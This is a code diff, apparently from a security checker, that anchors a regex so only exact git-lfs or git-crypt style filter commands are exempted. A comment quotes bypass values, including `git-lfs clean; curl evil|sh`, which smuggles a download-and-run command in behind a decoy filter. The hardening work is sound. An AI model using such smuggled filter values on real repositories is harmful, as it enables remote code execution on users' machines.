@@ -3671,9 +3671,15 @@ const CONFIG_PROGRAM_VERBS: ReadonlyArray<readonly [RegExp, ReadonlySet<string>]
  *  whether a stat-dirty file really changed — but a DECLARED filter doing that is ordinary work. */
 const GIT_READ_VERBS = new Set(['status', 'diff', 'grep', 'ls-files', 'describe',
   'diff-files', 'diff-index', 'update-index']);
-/** The content filters a repository installs as a matter of course, named by the program they run. Git LFS is the
- *  reason the read verbs were exempted at all; naming it keeps that reason and drops the blanket. */
-const DECLARED_CONTENT_FILTERS = /^\s*(git-lfs\b|git\s+lfs\b|git-crypt\b|git-annex\b|git-fat\b|git-media\b)/i;
+/** The content filters a repository installs as a matter of course. Git LFS is the reason the read verbs were
+ *  exempted at all; naming it keeps that reason and drops the blanket.
+ *
+ *  THE WHOLE VALUE MUST BE ONE OF THEM, not merely start with one. A prefix test exempted `git-lfs-evil clean`
+ *  — a different program whose name begins the same way — and `git-lfs clean; curl evil|sh`, where the declared
+ *  filter is a decoy in front of a second command (self-attack before exit review 8). The value is anchored at
+ *  both ends and may carry only the filter's own subcommand and placeholders. */
+const DECLARED_CONTENT_FILTERS =
+  /^\s*(git-lfs|git\s+lfs|git-crypt|git-annex|git-fat|git-media)\s+(clean|smudge|filter|filter-process|process|init)(\s+(--?[\w-]+|%f|--))*\s*$/i;
 
 /** A verb set that is EMPTY means "every verb": the key names a program and this resolver cannot say which
  *  commands git will run it for, so it never claims that a given verb is out of its scope. */
